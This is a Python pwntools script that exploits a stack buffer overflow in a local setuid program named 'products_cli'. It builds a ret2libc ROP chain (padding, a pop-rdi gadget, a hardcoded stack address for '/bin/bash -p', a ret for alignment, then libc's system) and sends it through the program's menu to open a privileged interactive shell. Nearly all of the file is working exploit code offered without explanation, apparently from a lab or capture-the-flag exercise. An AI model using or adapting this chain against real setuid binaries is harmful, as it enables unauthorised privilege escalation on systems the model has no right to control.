from pwn import *

BINARY = '/lib/x86_64-linux-gnu/libc.so.6'

def run(exe):
    rop = ROP(exe, badchars='\n')

    libc_base_address = "0x00007ffff7c00000"

    offset= b"A"*(264)

  
    pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address

    #binsh = next(exe.search(b'/bin/sh'))
    #print(hex(binsh))
    system = exe.symbols["system"]

    #binsh = next(exe.search(b'/bin/sh'))
    
    pop_rdi = int(libc_base_address, 16)+ pop_rdi
    #binsh = int(libc_base_address, 16)+ binsh
    
    SHELL2 = "/bin/bash -p"
    binsh=int("0x7fffffffecae", 16)

    #SHELL2 = "id > e.txt"
    #binsh=int("0x7fffffffecb0", 16)
    system = int(libc_base_address, 16) + system
    print(hex(system))

    #only for ret2libc with libc compiled for ubuntu (for stack alignment)
    ret = rop.find_gadget(['ret']).address
    ret = int(libc_base_address,16) + ret

    chain = flat(
        offset,
        pop_rdi,
        binsh,
        ret,
        system)
    print(chain)


    p = process("./products_cli", setuid=True)

    
    print(p.recvuntil(b"Enter your choice:\n"))
    p.sendline(b"2")
    print(p.recvline())
    p.sendline()
    #to attach gdb 
    input()
    print(p.recvline())
    p.sendline(chain)
    #input()
    print(p.recvline())
    p.sendline()
    #input()
    p.interactive()



if __name__ == '__main__':
    context(arch='amd64')
    exe = ELF(BINARY, checksec=False)
    run(exe)


#0x00007fffffffdda0
